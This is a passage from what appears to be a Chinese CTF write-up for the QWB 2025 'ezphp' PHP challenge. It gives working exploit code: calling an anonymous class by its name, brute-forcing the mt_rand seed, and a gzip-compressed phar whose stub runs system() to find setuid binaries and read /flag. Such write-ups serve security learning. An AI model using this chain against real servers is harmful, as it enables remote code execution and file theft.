class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable language_">$this</span>-&gt;readflag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_declared_classes</span>());</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_declared_classes</span>());</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&quot;class@anonymous\0E:\CTFDoc\\2025\qwb\\testezphp\\test\\2.php:8<span class="subst">$0</span>&quot;</span>;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="variable">$func</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;<span class="title function_ invoke__">readflag</span>();</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">D:\softwares\phpstudy_pro\Extensions\php\php7.<span class="number">4.3</span>nts\php.exe -c D:\softwares\phpstudy_pro\Extensions\php\php7.<span class="number">4.3</span>nts\php.ini E:\CTFDoc\<span class="number">2025</span>\qwb\testezphp\test\<span class="number">2</span>.php</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">stdClass</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Exception</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="built_in">ErrorException</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="built_in">Error</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="built_in">CompileError</span></span><br><span class="line">...</span><br><span class="line">    [<span class="number">141</span>] =&gt; PharException</span><br><span class="line">    [<span class="number">142</span>] =&gt; Phar</span><br><span class="line">    [<span class="number">143</span>] =&gt; PharData</span><br><span class="line">    [<span class="number">144</span>] =&gt; PharFileInfo</span><br><span class="line">    [<span class="number">145</span>] =&gt; test</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">construct readflag</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">stdClass</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Exception</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="built_in">ErrorException</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="built_in">Error</span></span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="built_in">CompileError</span></span><br><span class="line">...</span><br><span class="line">    [<span class="number">142</span>] =&gt; Phar</span><br><span class="line">    [<span class="number">143</span>] =&gt; PharData</span><br><span class="line">    [<span class="number">144</span>] =&gt; PharFileInfo</span><br><span class="line">    [<span class="number">145</span>] =&gt; <span class="keyword">class</span>@anonymous <span class="attr">E</span>:\CTFDoc\<span class="number">2025</span>\qwb\testezphp\test\<span class="number">2</span>.<span class="attr">php</span>:<span class="number">8</span>$<span class="number">0</span></span><br><span class="line">    [<span class="number">146</span>] =&gt; test</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">construct readflag</span><br><span class="line"></span><br><span class="line">called  readflag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以直接构造出匿名类的对象并执行方法,并且仅仅依赖其类名!</p><p>但随即而来出现第二个问题:</p><p>对于方法调用, 此题只能控制test类中的:<code>$func();</code> $fun是我们唯一可控的变量, 这似乎只能调用函数或者test类中的方法. 鉴于php的灵活性, 直接拷打ai得出</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213844.png" alt="image.png"><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213852.png" alt="image.png"><br>这似乎可行</p><p>但题目中匿名类的readflag并不是静态的, 进行尝试<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213906.png" alt="image.png"></p><p>题目的php版本为7.4.33, 这样的调用方式在php 7.4.3中仅仅是Deprecated, 依然可用!</p><p>到这里, 所有问题几乎已经全部解决, 我们可以首先 new test()了触发 test#__construct, 加载匿名类并进行文件上传, 之后构造调用匿名类的readflag进行文件包含</p><p>对于readflag中的waf:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;call internal readflag\n&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">                    <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/:\/\//&#x27;</span>, <span class="variable">$file</span>)) <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">                    <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;Illegal content detected in the file.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>经常打国际赛的师傅对此应该并不陌生, 他首次出现在deadsec ctf 2025 # baby-web, 这里并不能直接绕过, 而是需要构造gzip压缩的phar文件对其包含, 可以参考 <a href="https://wx.zsxq.com/topic/1524844181242522">https://wx.zsxq.com/topic/1524844181242522</a></p><p>但很快就有新的问题出现, 此方法被包含的路径必须包含 .phar 这个字符串, 我们对题目生成的文件名进行分析</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213941.png" alt="image.png"></p><p>$randomStr之前被拼接了一个 . 点号, 查看generateRandomString方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用rand这样的伪随机来生成</p><p>这里播种使用的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br></pre></td></tr></table></figure><p>$GLOBALS[‘filename’];是完全可控的, 而date(‘Hi’);的变化具有很小的一段时间间隔, 因此我们可以在这一段时间间隔中爆破$filename, 使generateRandomString得到类似 pharabcd这样的字符串, 此时记录下$filename, 在窗口期未结束时进行上传并包含,使得服务器generateRandomString也得到相同的字符串 就可以成功利用!</p><p>编写脚本测试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$time</span> = <span class="string">&quot;0000&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$time</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="string">&quot;368796&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$seed</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$filename</span> = <span class="number">0</span>; <span class="variable">$filename</span> &lt; <span class="number">2000000000</span>; <span class="variable">$filename</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>, <span class="string">&#x27;phar&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;found: filename=<span class="subst">$filename</span> seed=<span class="subst">$seed</span> =&gt; <span class="subst">$s</span>\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214004.png" alt="image.png"></p><p>可以看见是可以爆破出我们需要的字符串的, 并且速度非常快</p><p>至此, 所有的问题已经解决, 只需要按照思路编写脚本执行即可, 但在我测试时发现, windows的匿名类名和linux中并不相同, 并且eval中和eval外也不同,</p><p>我对题目代码做出最小改动, 起一个docker来获取类名</p><p>代码:(其中包含对匿名类名的打印)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt2YXJfZHVtcChnZXRfY2xhc3MoJHRoaXMtPnJlYWRmbGFnKSk7fXB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCl7JGZ1bmMgPSAkdGhpcy0+ZjskR0xPQkFMU1snZmlsZW5hbWUnXSA9ICR0aGlzLT5yZWFkZmxhZztpZiAoJHRoaXMtPmtleSA9PSAnY2xhc3MnKW5ldyAkZnVuYygpO2Vsc2UgaWYgKCR0aGlzLT5rZXkgPT0gJ2Z1bmMnKSB7JGZ1bmMoKTt9IGVsc2Uge2hpZ2hsaWdodF9maWxlKCdpbmRleC5waHAnKTt9fX0kc2VyID0gaXNzZXQoJF9HRVRbJ2xhbmQnXSkgPyAkX0dFVFsnbGFuZCddIDogJ086NDoidGVzdCI6Tic7QHVuc2VyaWFsaXplKCRzZXIpOw==&#x27;</span>));</span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.4</span>.<span class="number">33</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /var/www/html/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R www-data:www-data /var/www/html \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">chmod</span> -R 775 /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> www-data</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214034.png" alt="image.png"><br>可以看见linux eval中, 匿名类的类名类似</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>\0/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">index</span>.<span class="title">php</span>(1) : <span class="title">eval</span>()&#x27;<span class="title">d</span> <span class="title">code</span>:1$0</span></span><br></pre></td></tr></table></figure><p>并且$0会随着运行次数的增加递增为$1, $2…,</p><p>因此我们编写脚本, 并且每次需要重启靶机或者递增$0</p><p>首先是genphar.php 生成phar文件</p><p>最终利用需要base64进行提权:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;&#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php  </span></span><br><span class="line"><span class="string">    system(&#x27;find / -user root -perm -4000 -print 2&gt;/dev/null;base64 &quot;/flag&quot; | base64 --decode;&#x27;);    </span></span><br><span class="line"><span class="string">    __HALT_COMPILER();?&gt;  </span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;dummy.txt&#x27;</span>, <span class="string">&#x27;dummy&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的phar文件使用gzip压缩为nacl.txt.gz</p><p>由于需要使用php编写脚本, 这里使用guzzle来发送请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require guzzlehttp/guzzle</span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilename</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$r</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span 